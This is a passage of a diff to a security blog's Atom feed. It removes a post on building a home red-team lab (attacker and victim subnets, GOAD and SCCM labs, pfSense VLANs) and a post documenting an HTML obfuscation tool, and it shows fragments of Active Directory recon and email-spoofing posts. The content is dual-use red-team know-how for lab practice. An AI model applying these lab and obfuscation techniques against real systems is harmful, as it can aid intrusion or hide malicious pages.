style=\&quot;rounded=1;whiteSpace=wrap;html=1;fillColor=none;strokeWidth=3;glass=0;strokeColor=#EDEDED;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;24\&quot; y=\&quot;70\&quot; width=\&quot;780\&quot; height=\&quot;590\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;/root&gt;&lt;/mxGraphModel&gt;&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div>
-    <script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script>
-  </body></html>
-<p><br /></p>
-
-<p>Here the networking can be as simple as above or it can go as complex as possible depending on your imagination how you wanted to create the whole environment.</p>
-
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">Attacker Network</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.10.0/24</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Public Cloud Services</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.50.0/24</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Complete Victim Network</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.100.0/24</code>, <code class="language-plaintext highlighter-rouge">172.16.110.0/24</code>, <code class="language-plaintext highlighter-rouge">172.16.120.0/24</code></li>
-</ol>
-
-<p>The reason behind using multiple Victim networks is to have multiple environments in the LAB where there is some consistency can be seen, when ever you wanted to deploy new labs and stuff like that. In my case I’ve couple of Labs set in the victim network.</p>
-
-<ol>
-  <li>GOAD [The Game Of Active Directory]</li>
-  <li>SCCM / MECM LAB</li>
-</ol>
-
-<p>Both the labs are build by <code class="language-plaintext highlighter-rouge"># Orange Cyberdefense</code>. So, from the above structure, I’ve my Victim network as follows.</p>
-
-<ol>
-  <li>GOAD -&gt; <code class="language-plaintext highlighter-rouge">172.16.100.0/24</code></li>
-  <li>SCCM -&gt; <code class="language-plaintext highlighter-rouge">172.16.110.0/24</code></li>
-</ol>
-
-<blockquote class="notice--info">
-  <p>So now the question is how to setup this using <code class="language-plaintext highlighter-rouge">pfsense</code>?</p>
-</blockquote>
-
-<p>The above networking is achieved by setting up multiple V-LANS in <code class="language-plaintext highlighter-rouge">PFSense</code> firewall and adding firewall rules. Also, will be covering the networking part of the story using <code class="language-plaintext highlighter-rouge">PFSense</code>. The story kept for some other day.</p>
-
-<h3 id="stay-tuned-for-the-upcoming-blog">Stay tuned for the upcoming blog!!</h3>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[How to Setup a Red-Teams infrastructure at Home]]></summary></entry><entry><title type="html">Game of Active Directory - Part 2 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p2/" rel="alternate" type="text/html" title="Game of Active Directory - Part 2 [Recon]" /><published>2024-12-07T00:00:00+05:30</published><updated>2024-12-07T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p2</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p2/"><![CDATA[<h2 id="enumerate-network">Enumerate Network</h2>
+</code></pre></div></div>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD" /><category term="HomeLab" /><category term="Active-Drirectory" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">Game of Active Directory - Part 2 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p2/" rel="alternate" type="text/html" title="Game of Active Directory - Part 2 [Recon]" /><published>2024-12-07T00:00:00+05:30</published><updated>2024-12-07T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p2</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p2/"><![CDATA[<h2 id="enumerate-network">Enumerate Network</h2>
 <p>We’ll start enumerating the network</p>
 <h3 id="nmap-scanning-the-whole-ad-range">Nmap Scanning the whole AD range</h3>
 
@@ -1299,305 +1518,4 @@ graph TB; A[AD Security Assessment] --&gt; B[Assume Breach]; A --&gt; C[External
 
 <hr />
 
-<p><em>Remember: Email security is not a one-time task but an ongoing process. Regular assessment and updates are key to maintaining strong protection against spoofing attempts.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python," /><category term="Go-lang" /><summary type="html"><![CDATA[This tool checks if domain spoofing is possible or not.]]></summary></entry><entry><title type="html">HTML-Obfuscator</title><link href="http://localhost:4000/tools/HTML-Obfuscator/" rel="alternate" type="text/html" title="HTML-Obfuscator" /><published>2024-10-02T00:00:00+05:30</published><updated>2024-10-02T00:00:00+05:30</updated><id>http://localhost:4000/tools/HTML-Obfuscator</id><content type="html" xml:base="http://localhost:4000/tools/HTML-Obfuscator/"><![CDATA[<h1 id="html_obfuscator-a-python-tool-for-html-code-protection">HTML_Obfuscator: A Python Tool for HTML Code Protection</h1>
-
-<h2 id="table-of-contents">Table of Contents</h2>
-<ul>
-  <li><a href="#introduction">Introduction</a></li>
-  <li><a href="#understanding-html-obfuscation">Understanding HTML Obfuscation</a></li>
-  <li><a href="#features-overview">Features Overview</a></li>
-  <li><a href="#installation-guide">Installation Guide</a></li>
-  <li><a href="#usage-instructions">Usage Instructions</a></li>
-  <li><a href="#advanced-features">Advanced Features</a></li>
-  <li><a href="#best-practices">Best Practices</a></li>
-  <li><a href="#use-cases">Use Cases</a></li>
-  <li><a href="#technical-deep-dive">Technical Deep Dive</a></li>
-  <li><a href="#conclusion">Conclusion</a></li>
-</ul>
-
-<h2 id="introduction">Introduction</h2>
-
-<p>In the world of web development, protecting your HTML source code from unauthorized copying or reverse engineering is increasingly important. HTML_Obfuscator emerges as a powerful Python-based solution that enables developers to obfuscate and de-obfuscate HTML files efficiently, offering both single-file and batch processing capabilities.</p>
-
-<h2 id="understanding-html-obfuscation">Understanding HTML Obfuscation</h2>
-
-<h3 id="what-is-html-obfuscation">What is HTML Obfuscation?</h3>
-<p>HTML obfuscation is the process of transforming readable HTML code into a more complex, harder-to-understand format while maintaining its functionality. This technique helps:</p>
-
-<ul>
-  <li>Protect intellectual property</li>
-  <li>Prevent unauthorized code copying</li>
-  <li>Make reverse engineering more difficult</li>
-  <li>Reduce code readability for potential attackers</li>
-</ul>
-
-<h3 id="why-use-html_obfuscator">Why Use HTML_Obfuscator?</h3>
-<ul>
-  <li><strong>Simplicity</strong>: Easy-to-use Python interface</li>
-  <li><strong>Batch Processing</strong>: Handle multiple files simultaneously</li>
-  <li><strong>Reversible</strong>: Built-in de-obfuscation capability</li>
-  <li><strong>Flexibility</strong>: Various output options</li>
-  <li><strong>Performance</strong>: Minimal impact on page load times</li>
-</ul>
-
-<h2 id="features-overview">Features Overview</h2>
-
-<h3 id="core-capabilities">Core Capabilities</h3>
-<ol>
-  <li><strong>Single File Processing</strong>
-    <ul>
-      <li>Obfuscate individual HTML files</li>
-      <li>Generate protected output files</li>
-      <li>Maintain original functionality</li>
-    </ul>
-  </li>
-  <li><strong>Batch Processing</strong>
-    <ul>
-      <li>Process entire directories</li>
-      <li>Maintain folder structure</li>
-      <li>Bulk operation support</li>
-    </ul>
-  </li>
-  <li><strong>De-obfuscation Support</strong>
-    <ul>
-      <li>Reverse obfuscation process</li>
-      <li>Restore original code format</li>
-      <li>Debug obfuscated files</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="installation-guide">Installation Guide</h2>
-
-<h3 id="prerequisites">Prerequisites</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Required Python version</span>
-Python 3.x
-</code></pre></div></div>
-
-<h3 id="setup-process">Setup Process</h3>
-<ol>
-  <li>Clone the repository:
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/DcodeZero/Html_Obfuscator
-</code></pre></div>    </div>
-  </li>
-  <li>Navigate to directory:
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>Html_Obfuscator
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<h2 id="usage-instructions">Usage Instructions</h2>
-
-<h3 id="basic-commands">Basic Commands</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Single file obfuscation</span>
-python html_obfuscator.py <span class="nt">-oF</span> input.html <span class="nt">-o</span> output.html
-
-<span class="c"># Directory processing</span>
-python html_obfuscator.py <span class="nt">-oD</span> <span class="nt">-P</span> /path/to/directory <span class="nt">-O</span> /output/directory
-
-<span class="c"># De-obfuscation</span>
-python html_obfuscator.py <span class="nt">-dF</span> input.html <span class="nt">-o</span> output.html
-</code></pre></div></div>
-
-<h3 id="command-line-arguments">Command Line Arguments</h3>
-<p>| Argument | Description | Example |
-|———-|————-|———|
-| -oF | Obfuscate single file | -oF input.html |
-| -oD | Obfuscate directory | -oD |
-| -dF | De-obfuscate file | -dF obfuscated.html |
-| -dD | De-obfuscate directory | -dD |
-| -p | Path to input file | -p /path/to/file |
-| -P | Path to input directory | -P /path/to/dir |
-| -o | Output file path | -o output.html |
-| -O | Output directory path | -O /output/dir |</p>
-
-<h2 id="advanced-features">Advanced Features</h2>
-
-<h3 id="customization-options">Customization Options</h3>
-<ol>
-  <li><strong>Obfuscation Levels</strong>
-    <ul>
-      <li>Basic encoding</li>
-      <li>Advanced scrambling</li>
-      <li>Custom patterns</li>
-    </ul>
-  </li>
-  <li><strong>Output Formatting</strong>
-    <ul>
-      <li>Minification options</li>
-      <li>Whitespace handling</li>
-      <li>Comment preservation</li>
-    </ul>
-  </li>
-  <li><strong>Batch Processing Controls</strong>
-    <ul>
-      <li>File filtering</li>
-      <li>Directory recursion</li>
-      <li>Error handling</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="best-practices">Best Practices</h2>
-
-<h3 id="when-obfuscating">When Obfuscating</h3>
-<ol>
-  <li><strong>Backup Original Files</strong>
-    <ul>
-      <li>Keep original versions safe</li>
-      <li>Document obfuscation parameters</li>
-      <li>Maintain version control</li>
-    </ul>
-  </li>
-  <li><strong>Testing</strong>
-    <ul>
-      <li>Verify functionality post-obfuscation</li>
-      <li>Check browser compatibility</li>
-      <li>Validate user experience</li>
-    </ul>
-  </li>
-  <li><strong>Performance Considerations</strong>
-    <ul>
-      <li>Monitor file size changes</li>
-      <li>Check load time impact</li>
-      <li>Optimize when necessary</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="use-cases">Use Cases</h2>
-
-<h3 id="development-scenarios">Development Scenarios</h3>
-<ol>
-  <li><strong>Commercial Projects</strong>
-    <ul>
-      <li>Protect proprietary code</li>
-      <li>Secure client deliverables</li>
-      <li>Maintain competitive advantage</li>
-    </ul>
-  </li>
-  <li><strong>Educational Platforms</strong>
-    <ul>
-      <li>Protect assessment content</li>
-      <li>Secure learning materials</li>
-      <li>Prevent solution sharing</li>
-    </ul>
-  </li>
-  <li><strong>Enterprise Applications</strong>
-    <ul>
-      <li>Secure internal tools</li>
-      <li>Protect company assets</li>
-      <li>Maintain code confidentiality</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="technical-deep-dive">Technical Deep Dive</h2>
-
-<h3 id="obfuscation-process">Obfuscation Process</h3>
-<pre><code class="language-mermaid">graph LR
-    A[Input HTML] --&gt; B[Parser]
-    B --&gt; C[Transformer]
-    C --&gt; D[Encoder]
-    D --&gt; E[Output HTML]
-</code></pre>
-
-<h3 id="code-examples">Code Examples</h3>
-
-<h4 id="simple-obfuscation">Simple Obfuscation</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file obfuscation</span>
-python html_obfuscator.py <span class="nt">-oF</span> <span class="nt">-p</span> index.html <span class="nt">-o</span> protected.html
-</code></pre></div></div>
-
-<h4 id="batch-processing">Batch Processing</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Process entire website</span>
-python html_obfuscator.py <span class="nt">-oD</span> <span class="nt">-P</span> ./website <span class="nt">-O</span> ./protected-site
-</code></pre></div></div>
-
-<h3 id="performance-metrics">Performance Metrics</h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>Operation</th>
-      <th>Average Time</th>
-      <th>File Size Impact</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Single File</td>
-      <td>&lt; 1 second</td>
-      <td>+5-15%</td>
-    </tr>
-    <tr>
-      <td>Directory (10 files)</td>
-      <td>2-3 seconds</td>
-      <td>+10-20%</td>
-    </tr>
-    <tr>
-      <td>De-obfuscation</td>
-      <td>&lt; 1 second</td>
-      <td>Original size</td>
-    </tr>
-  </tbody>
-</table>
-
-<h2 id="security-considerations">Security Considerations</h2>
-
-<h3 id="protection-level">Protection Level</h3>
-<ul>
-  <li>Basic obfuscation suitable for most use cases</li>
-  <li>Additional security layers recommended for sensitive applications</li>
-  <li>Regular updates to obfuscation patterns advised</li>
-</ul>
-
-<h3 id="limitations">Limitations</h3>
-<ul>
-  <li>Not a replacement for server-side security</li>
-  <li>May impact page load performance</li>
-  <li>Debug capabilities might be affected</li>
-</ul>
-
-<h2 id="troubleshooting-guide">Troubleshooting Guide</h2>
-
-<h3 id="common-issues">Common Issues</h3>
-<ol>
-  <li><strong>File Processing Errors</strong>
-    <ul>
-      <li>Check file permissions</li>
-      <li>Verify file paths</li>
-      <li>Ensure valid HTML input</li>
-    </ul>
-  </li>
-  <li><strong>Output Problems</strong>
-    <ul>
-      <li>Verify output directory exists</li>
-      <li>Check disk space</li>
-      <li>Validate file access rights</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="conclusion">Conclusion</h2>
-
-<p>HTML_Obfuscator provides a robust solution for protecting HTML source code through obfuscation. Its combination of ease of use, batch processing capabilities, and reversible operations makes it an invaluable tool for developers looking to secure their web assets while maintaining functionality.</p>
-
-<h2 id="resources">Resources</h2>
-
-<h3 id="documentation">Documentation</h3>
-<ul>
-  <li><a href="https://github.com/DcodeZero/Html_Obfuscator">Official Repository</a></li>
-  <li><a href="https://github.com/DcodeZero/Html_Obfuscator/issues">Issue Tracker</a></li>
-</ul>
-
-<h3 id="community">Community</h3>
-<ul>
-  <li>Report bugs through GitHub Issues</li>
-  <li>Contribute improvements via Pull Requests</li>
-  <li>Share experiences in Discussions</li>
-</ul>
-
-<hr />
-
-<p><em>Note: Regular updates and community feedback help improve tool effectiveness and security.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python" /><summary type="html"><![CDATA[Simple Python program to Obfuscate and Dobfuscate HTML files. The program also allows you to obfuscate and Dobfuscate multiple files in one go.]]></summary></entry></feed>
+<p><em>Remember: Email security is not a one-time task but an ongoing process. Regular assessment and updates are key to maintaining strong protection against spoofing attempts.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python," /><category term="Go-lang" /><summary type="html"><![CDATA[This tool checks if domain spoofing is possible or not.]]></summary></entry></feed>
